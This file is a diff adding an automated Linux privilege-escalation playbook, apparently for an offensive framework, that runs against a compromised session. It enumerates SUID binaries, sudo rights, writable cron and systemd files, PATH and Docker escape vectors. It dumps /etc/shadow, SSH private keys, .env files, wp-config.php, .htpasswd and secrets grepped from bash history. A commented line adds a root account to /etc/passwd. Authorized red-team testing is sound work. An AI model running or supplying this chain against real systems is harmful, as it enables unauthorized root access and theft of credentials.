@@ -1,0 +1,89 @@
+# ===========================================================================
+# Megaploit Community Playbook — Linux Privilege Escalation Chain
+# ===========================================================================
+# Objective : Enumerate common Linux privesc vectors from an unprivileged
+#             shell and attempt the most reliable paths automatically.
+#
+# TTPs covered (MITRE ATT&CK):
+#   T1548.001  Setuid / Setgid Abuse
+#   T1548.003  Sudo Abuse
+#   T1053.003  Cron Job Abuse
+#   T1574.006  Dynamic Linker Hijacking
+#   T1543.002  Systemd Service Abuse
+#   T1552.004  Private Keys in Files
+#   T1087.001  Local Account Discovery
+#
+# Variables:
+#   ${SESSION}  — target Linux session ID
+#
+# Usage:
+#   resource playbooks/linux_privesc.rc
+# ===========================================================================
+
+session ${SESSION}
+
+# ── Phase 0: Situational Awareness ──────────────────────────────────────────
+shell id
+shell uname -a
+shell cat /etc/os-release
+shell cat /proc/version
+shell hostname
+shell whoami
+shell env
+
+# ── Phase 1: SUID / SGID Binary Abuse ───────────────────────────────────────
+shell find / -perm -4000 -type f 2>/dev/null
+shell find / -perm -2000 -type f 2>/dev/null
+# GTFOBins-notable SUID binaries:
+shell find / -perm -4000 -type f 2>/dev/null | grep -E "bash|sh|python|perl|ruby|find|nmap|vim|less|more|awk|env|cp|mv|tee|dd|tar|zip|unzip|wget|curl|nc|netcat"
+
+# ── Phase 2: Sudo -l Enumeration ────────────────────────────────────────────
+shell sudo -l 2>/dev/null
+shell cat /etc/sudoers 2>/dev/null
+shell ls -la /etc/sudoers.d/ 2>/dev/null
+
+# ── Phase 3: Cron Job Abuse ──────────────────────────────────────────────────
+shell cat /etc/crontab
+shell ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null
+shell crontab -l 2>/dev/null
+# Find cron scripts writable by current user
+shell find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null
+
+# ── Phase 4: Writable Service / Systemd Unit Files ───────────────────────────
+shell find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null
+shell systemctl list-units --type=service --state=running 2>/dev/null | head -30
+
+# ── Phase 5: PATH Hijacking + LD_PRELOAD ─────────────────────────────────────
+shell echo $PATH
+shell find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null
+shell sudo -l 2>/dev/null | grep "LD_PRELOAD"
+
+# ── Phase 6: Passwords / Keys in Files ───────────────────────────────────────
+shell find / -name "*.pem" -o -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | grep -v proc
+shell find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -liE "password|passwd|secret" 2>/dev/null | head -20
+shell cat /etc/passwd | grep -v "nologin\|false"
+shell cat /etc/shadow 2>/dev/null
+
+# ── Phase 7: Writable /etc/passwd ────────────────────────────────────────────
+shell ls -la /etc/passwd /etc/shadow /etc/group 2>/dev/null
+# If /etc/passwd is writable — add root user (lab only):
+# shell echo 'pwned:$(openssl passwd -6 pwned123):0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# ── Phase 8: Docker / LXC Escape ─────────────────────────────────────────────
+shell cat /proc/1/cgroup 2>/dev/null | grep -i docker
+shell ls -la /.dockerenv 2>/dev/null
+shell id | grep docker
+shell ls -la /var/run/docker.sock 2>/dev/null
+
+# ── Phase 9: Kernel Exploit Check ────────────────────────────────────────────
+shell uname -r
+shell dpkg -l linux-image* 2>/dev/null | grep ii
+shell rpm -qa kernel 2>/dev/null
+
+# ── Phase 10: Credential Harvest ─────────────────────────────────────────────
+shell cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|token" | head -30
+shell find / -name ".env" 2>/dev/null | xargs grep -liE "password|secret|key" 2>/dev/null | head -10
+shell find / -name "wp-config.php" -o -name "database.yml" -o -name ".htpasswd" 2>/dev/null | head -10 | xargs cat 2>/dev/null
+
+# ── Report ───────────────────────────────────────────────────────────────────
+loot list
